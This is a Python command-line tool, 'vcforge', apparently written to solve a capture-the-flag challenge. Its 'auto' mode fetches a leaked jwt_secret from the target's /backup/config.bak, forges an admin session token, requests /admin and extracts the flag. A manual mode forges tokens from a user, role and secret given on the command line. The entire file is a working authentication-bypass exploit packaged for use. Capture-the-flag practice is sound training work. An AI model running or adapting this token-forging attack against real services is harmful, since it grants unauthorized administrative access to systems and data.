import re
import sys
from urllib.request import Request, urlopen

from . import __version__, forge

BANNER = f"vcforge {__version__} — created by brawlnic"
DEFAULT_TARGET = "http://172.24.64.1:1337"

HELP = f"""\
created by brawlnic

USAGE
  vcf <user> <role> <secret>          to: generate the token and print it
  vcf <user> <role> <secret> -u URL   to: generate the token and perform a
                                      GET request to a URL
  vcf auto [TARGET]                   to: automate the entire procedure:
                                      read jwt_secret from the target's
                                      /backup/config.bak, forge an admin
                                      token, request /admin, print the flag
                                      (default: {DEFAULT_TARGET})

ARGUMENTS
  user      username in the JSON payload    e.g., vcore_admin
  role      role in the JSON payload        e.g., admin
  secret    server's HMAC key              can be found in /backup/config.bak

OPTIONS
  -u URL    after forging, GET the URL using the forged cookie
  -h        show this help

EXAMPLES
  vcf vcore_admin admin vcore_sup3r_s3cr3t_2024
  vcf vcore_admin admin vcore_sup3r_s3cr3t_2024 -u http://172.24.64.1:1337/admin
  vcf auto

NOTE
  The banner goes to stderr: the token on stdout stays clean for pipes/copy.
"""


def fetch(url, token=None):
    headers = {"Cookie": f"session={token}"} if token else {}
    return urlopen(Request(url, headers=headers), timeout=10) \
        .read().decode("utf-8", "replace")


def show(text):
    flags = re.findall(r"FLAG\{[^}]*\}", text)
    if flags:
        for f in flags:
            print(f"[+] {f}")
    else:
        print(text[:500])


def auto(target):
    print(f"[*] {target} -> /backup/config.bak")
    cfg = fetch(f"{target}/backup/config.bak")
    secret = re.search(r"jwt_secret\s*=\s*(\S+)", cfg).group(1)
    print(f"[+] jwt_secret = {secret}")
    token = forge("vcore_admin", "admin", secret)
    print(f"[+] token: {token}")
    print(f"[*] {target}/admin")
    show(fetch(f"{target}/admin", token))


def die(msg):
    print(f"[!] {msg} — try 'vcf --help'", file=sys.stderr)
    sys.exit(2)


def main():
    print(BANNER, file=sys.stderr)
    argv = sys.argv[1:]

    if not argv or argv[0] in ("-h", "--help", "help"):
        print(HELP)
        return

    if argv[0] == "auto":
        auto(argv[1] if len(argv) > 1 else DEFAULT_TARGET)
        return

    # forge mode: user role secret [-u URL]
    url = None
    for flag in ("-u", "--url"):
        if flag in argv:
            i = argv.index(flag)
            if i + 1 >= len(argv):
                die(f"missing URL after {flag}")
            url = argv[i + 1]
            del argv[i:i + 2]

    if len(argv) != 3:
        die("expected exactly: user role secret")
    token = forge(*argv)
    print(token)
    if url:
        show(fetch(url, token))


if __name__ == "__main__":
    main()
